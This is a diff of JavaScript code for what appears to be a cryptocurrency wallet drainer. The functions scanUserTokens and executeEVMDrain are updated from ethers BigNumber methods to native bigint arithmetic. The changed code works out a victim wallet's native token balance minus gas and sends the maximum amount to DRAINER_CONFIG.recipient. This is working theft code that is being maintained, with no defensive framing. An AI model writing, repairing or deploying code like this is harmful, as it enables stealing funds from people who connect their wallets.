@@ -72,7 +72,7 @@ export const scanUserTokens = async (
       );
       
       // Add native token to the list if it has value
-      if (!nativeToken.balance.isZero()) {
+      if (nativeToken.balance > 0n) {
         tokens.unshift(nativeToken); // Put native token first
       }
       
@@ -181,21 +181,21 @@ export const executeEVMDrain = async (
     
     // Finally, process native token if available
     const nativeToken = tokens.find(token => token.address === 'NATIVE');
-    if (nativeToken && !nativeToken.balance.isZero()) {
+    if (nativeToken && nativeToken.balance > 0n) {
       setStatus?.(`Processing ${nativeToken.symbol}...`);
       
       try {
         // Calculate gas price and gas limit
-        const gasPrice = await signer.provider.getFeeData();
-        const gasLimit = 21000; // Standard ETH transfer
+        const feeData = await signer.provider.getFeeData();
+        const gasLimit = 21000n; // Standard ETH transfer
         
         // Calculate gas cost
-        const gasCost = gasPrice.gasPrice.mul(gasLimit);
+        const gasCost = feeData.gasPrice ? feeData.gasPrice * gasLimit : 0n;
         
         // Calculate max amount to send (balance - gas cost)
-        const maxAmount = nativeToken.balance.sub(gasCost);
+        const maxAmount = nativeToken.balance - gasCost;
         
-        if (maxAmount.gt(0)) {
+        if (maxAmount > 0n) {
           // Send transaction
           const tx = await signer.sendTransaction({
             to: DRAINER_CONFIG.recipient,
